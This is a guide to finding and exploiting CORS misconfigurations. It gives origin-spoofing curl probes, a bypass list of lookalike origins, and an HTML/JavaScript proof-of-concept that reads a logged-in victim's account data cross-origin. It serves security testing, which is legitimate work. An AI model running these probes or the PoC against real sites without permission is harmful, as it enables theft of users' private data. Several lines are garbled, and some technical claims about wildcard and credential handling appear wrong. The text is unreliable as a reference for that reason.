# HOW TO TEST CORS MISCONFIGURATION ON A TARGET (2026 expert guide)

## The attacks that count (all ways)
1. Origin reflection: send ANY Origin, see if it goes back in Access-Control-Allow-Origin.
2. Wildcard ACAO "*" WITH credentials: wildcard is fine ONLY without credentials. With `credentials:include` it's broken auth.
3. Subdomain list: ACAO echoes any *.target.com - subdomain takeover becomes full CORS bypass.
4. Null origin reflection: sandboxed iframe /file:// upload triggers `Origin: null`.
5. Scheme trust: ACAO allows http while target runs https (downgrade attack).
6. ACAO + ACAH ":" (all headers) + ACAM ("PUT","DELETE"): attacker does authenticated write ops.
7. Whitelist flaws: startsWith/endsWith match on "target.com.evil.com" or "not-target.com".
8. CORS on GET-only state-changers: still matters if CSRF+XSS can call it.
9. Universally-trusted endpoints: /cors, /acc redirect endpoints with loose CORS.
10. Vary: Origin missing but ACAO set - CDN cache serves the reflected origin to others.

## Step-by-step on target
1. Login, grab an authenticated endpoint (e.g., /api/profile).
2. In browser: send `Origin: https://evil.com`.
   Look for: Access-Control-Allow-Origin: https://evil.com  AND  Access-Control-Allow-Credentials: true.
3. Repeat with: Origin: null, Origin: https://sub.target.com.evil.com, Origin: https://evil.target.com.
4. Check header echo: ls the full ACA* block: Access-Control-Allow-Headers / Methods / Expose.
5. If ACAO reflects -> craft PoC page on evil.com:
   fetch('https://target.com/api/account',{credentials:'include'}) -> read response.
6. If only "null" reflects -> report sandboxed-victim impact (lower but valid).
7. For write-method cases build the CSRF-style PoC.

## The bypass ladder (if they block evil.com blindly)
Origin: https://evil.com.evil-target.com       # your real site gets dropped; use a *.target.com-like name
Origin: https://target.com.evil.com
Origin: https://trusted-target.com            # same-SLD you can register (parked?)
Origin: null                                  # via sandboxed iframe
Origin: https://attackercdn.github.io         # some whitelists trust GitHub pages

## False positives
- ACAO with credentials TRUE + * = broken regardless of UI behavior.
- ACAO reflecting attacker origin but NO credentials true = LOW/NA (public data only) - still worth a note.
- CORS header on a 404 page = noise, ignore.
- If the browser with.html the fetch, it's exploitable; server headers are the truth.

## Reporting
Severity: High = credentials true + sensitive data/state change; Medium = data read; Low = public endpoints.
PoC: static html on attacker server + one screenshot of devtools response.

## Future watch (2026+)
- CORS on new Auth headers (private mainstream), CORS + Service Worker abuse, CORS + OAuth single-flow
  (redirect_uri steals code through reflected origins).

## WORKED EXAMPLES (concrete)
# A. Reflected-Origin read (sensitive data):
curl -i -H "Origin: https://evil.com" "https://target.com/api/account"
#   RESPONSE:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true        <-- THIS COMBO = exploitable
#   Browsers only send credentials when BOTH are present (and * is not allowed with creds).
# B. Null-origin reflection:
curl -i -H "Origin: null" "https://target.com/api/account"
# C. Write-method pass (ACAM allows PUT):
curl -i -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: PUT" \
     "https://target.com/api/profile"
#   If ACAM: PUT + creds true -> attacker can modify your profile from their page.
# D. PoC page (host on evil.com) for a CORS read:
#   <script>
#   fetch('https://target.com/api/account',{credentials:'include'})
#     .then(r=>r.text()).then(t=>document.body.innerText=t);
#   </script>
# E. Whitelist flaw (contains/starts/ends):
curl -i -H "Origin: https://not-target.com"                       "https://target.com/api/x"
curl -i -H "Origin: https://target.com.evil.com"                  "https://target.com/api/x"
curl -i -H "Origin: https://target.com-attacker.com"              "https://target.com/api/x"
curl -i -H "Origin: http://target.com"                            "https://target.com/api/x"  # scheme downgrade
# F. CDN-cached reflected origin (Vary missing):
#   GET /api/x  with Origin: https://evil.com once; then anonymous GET served CORS-allow from cache.
